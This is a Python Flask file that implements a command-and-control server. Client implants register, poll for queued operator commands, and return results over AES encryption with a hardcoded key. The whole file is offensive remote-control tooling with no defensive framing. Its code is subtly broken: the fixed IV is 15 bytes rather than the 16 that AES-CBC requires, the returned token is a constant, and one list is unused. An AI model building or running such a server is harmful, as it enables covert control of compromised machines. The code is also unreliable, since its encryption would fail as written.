# c2_server.py
from flask import Flask, request, jsonify
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)

# Shared secret key (for simplicity, a hardcoded key)
SECRET_KEY = b'sixteen byte key'
clients = {}
commands = []

def encrypt_message(message):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, b'iv_16bytes_long')
    return base64.b64encode(cipher.encrypt(pad(message.encode(), AES.block_size))).decode()

def decrypt_message(encoded_message):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, b'iv_16bytes_long')
    return unpad(cipher.decrypt(base64.b64decode(encoded_message)), AES.block_size).decode()

@app.route('/register_client', methods=['POST'])
def register_client():
    client_id = request.json.get('client_id')
    if client_id:
        clients[client_id] = []
        return jsonify({'status': 'registered', 'token': 'client_token'}), 200
    return jsonify({'status': 'failed'}), 400

@app.route('/get_command/<client_id>', methods=['GET'])
def get_command(client_id):
    if client_id not in clients:
        return jsonify({'error': 'unauthorized'}), 403
    
    if clients[client_id]:
        return jsonify({'command': encrypt_message(clients[client_id].pop(0))})
    else:
        return jsonify({'command': None})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    client_id = data.get('client_id')
    encrypted_result = data.get('result')

    if client_id not in clients:
        return jsonify({'status': 'unauthorized'}), 403
    
    result = decrypt_message(encrypted_result)
    print(f"Result from {client_id}: {result}")
    return jsonify({'status': 'success'})

@app.route('/add_command', methods=['POST'])
def add_command():
    data = request.json
    command = data.get('command')
    client_id = data.get('client_id')
    if command and client_id in clients:
        clients[client_id].append(command)
        return jsonify({'status': 'command added'})
    return jsonify({'status': 'no command or invalid client'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
